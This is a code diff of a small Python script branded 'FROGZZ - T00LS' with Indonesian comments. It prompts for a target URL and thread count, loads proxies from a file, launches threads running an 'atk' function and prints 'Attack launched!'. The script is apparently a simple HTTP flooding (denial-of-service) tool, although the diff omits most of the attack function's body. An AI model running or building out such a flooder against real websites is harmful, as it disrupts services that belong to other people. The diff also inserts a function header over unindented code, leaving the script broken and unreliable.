@@ -2,7 +2,8 @@ import requests, threading, time, random
 from colorama import Fore, init
 init()
 
-# Clear tampilan (biar kayak hacker manual)
+
+def frogzz():
 try:
     import os
     os.system("clear")
@@ -13,15 +14,12 @@ print(Fore.RED + "╔═══════════════════�
 print(Fore.RED + "║         F R O G Z Z  -  T 0 0 L S     ║")
 print(Fore.RED + "╚══════════════════════════════════════╝\n")
 
-# Input Target & Theders
 tgt = input(Fore.YELLOW + "Target (ex: http://example.com) >> ")
 thedz = int(input("Theders [MAX 2] >> "))
 
-# Batasi maksimal threads
 if thedz > 2:
     thedz = 2
 
-# Load proxy dari file proxy.txt
 try:
     with open("proxy.txt", "r") as f:
         pxlist = f.read().splitlines()
@@ -41,11 +39,9 @@ def atk():
         except:
             continue
 
-# Jalankan thread sesuai input
 for i in range(thedz):
     threading.Thread(target=atk).start()
 
-# Tampil info selesai (tapi thread tetap jalan)
 print(Fore.GREEN + "\n[!] Attack launched! Press Ctrl+C to stop.\n")
 
 def ip_tracker():
